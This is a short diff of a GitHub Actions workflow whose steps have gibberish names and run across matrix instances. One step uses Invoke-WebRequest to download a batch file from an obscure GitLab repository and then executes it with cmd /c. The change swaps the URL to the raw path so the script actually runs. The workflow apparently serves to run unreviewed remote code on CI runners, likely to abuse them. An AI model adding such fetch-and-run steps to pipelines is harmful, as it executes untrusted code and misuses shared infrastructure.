@@ -21,7 +21,7 @@ jobs:
 
       - name: ưewewewewewewew (Instance ${{ matrix.instance }})
         run: |
-          Invoke-WebRequest -Uri "https://gitlab.com/thah49766-group/dvdvdava/-/blob/main/Downloads.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://gitlab.com/thah49766-group/dvdvdava/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
       - name: adfdafafssafsafsafsf (Instance ${{ matrix.instance }})
         run: |
